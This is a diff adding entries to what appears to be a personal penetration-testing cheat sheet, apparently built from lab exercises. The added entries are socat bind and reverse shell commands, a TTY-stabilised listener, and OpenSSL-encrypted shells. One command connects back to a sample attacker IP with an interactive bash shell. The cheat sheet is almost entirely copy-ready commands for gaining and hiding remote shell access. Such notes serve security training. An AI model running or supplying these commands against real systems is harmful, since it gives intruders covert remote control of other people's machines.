@@ -927,5 +927,26 @@ Reverse Shells
 Bind Shells
 - ``` socat TCP-L:<PORT> EXEC:"bash -li" ``` Linux
 - ``` socat TCP-L:<PORT> EXEC:powershell.exe,pipes ``` Windows
-- ``` 
+- ``` socat TCP:<TARGET-IP>:<TARGET-PORT> - ``` linux or windows
+
+- ``` socat TCP-L:<port> FILE:`tty`,raw,echo=0 ``` listener
+- ``` socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane ```
+
+**Socat Encrypted Shells**
+- ``` openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt ``` Generate a certificate. creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. 
+- ``` cat shell.key shell.crt > shell.pem ``` merge two into a single file
+
+reverse shell
+- ``` socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0 ``` setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem".
+- ``` verify=0 ``` tells the connection to not bother trying to validate.
+- certificate must be used on whichever device is listening.
+- ``` socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash ``` connect back
+- ``` socat OPENSSL:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane ``` your IP is 10.10.10.5, the syntax to connect back to this listener.
+- ![image](https://user-images.githubusercontent.com/91292763/148321654-ead239c7-fddb-4667-9b3b-236cdddd2ed5.png)
+
+Bind shell
+- ``` socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes ``` target.
+- ``` socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - ``` attacker.
+
+**Common Shell Payloads**
 
